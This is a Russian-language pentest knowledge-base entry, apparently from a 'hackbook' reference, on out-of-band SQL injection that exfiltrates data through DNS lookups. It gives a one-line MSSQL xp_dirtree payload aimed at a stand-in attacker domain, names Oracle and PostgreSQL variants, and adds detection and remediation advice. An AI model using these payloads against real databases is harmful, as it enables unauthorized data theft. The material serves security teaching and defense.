---
id: sqli-generic-out-of-band-dns
title: "Общее: out-of-band эксфильтрация через DNS"
type: sqli
target: generic
category: web
difficulty: advanced
bypass: waf
tags: [sqli, oob, dns, exfiltration]
tested_on: ["MSSQL (OPENROWSET)", "Oracle (UTL_HTTP)", "PostgreSQL (dblink)"]
success_rate: 0.35
risk: high
cwe: "CWE-201"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "data-exfiltration"
    type: leads_to
  - target: "oob"
    type: technique_of
---

# Общее: out-of-band эксфильтрация через DNS

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
'; EXEC master..xp_dirtree '\\data.attacker.tld\a'; --
```

## Explanation

Когда ответ приложения полностью одинаков (ни ошибок, ни таймингов, ни различий),
данные выводят во внешний канал — чаще всего DNS-запросом на контролируемый домен.
В MSSQL это `xp_dirtree`/`OPENROWSET`, в Oracle — `UTL_HTTP`/`UTL_INADDR`,
в PostgreSQL — `dblink` или `COPY TO PROGRAM 'nslookup ...'`.
Данные кодируются в поддомены: результат `SELECT` -> `<hex>.data.attacker.tld`.

## Detection

1. Мониторинг исходящих DNS-запросов СУБД-хоста к внешним доменам.
2. Egress-фильтрация: БД не должна резолвить произвольные имена.
3. В логах — `xp_dirtree`, `UTL_HTTP`, `dblink`.

## Remediation

- Жёсткая egress-фильтрация для серверов БД (только нужные хосты).
- Отключить `xp_dirtree`, `OPENROWSET`, `UTL_*`, `dblink`.
- Параметризация; минимальные привилегии.
- DNS-мониторинг и алерты на новые внешние домены.

## Notes

В лабораториях `hackbook` исходящий DNS для контейнеров закрыт — payload
проверяется только на факт попытки запроса (лог dnsmasq).
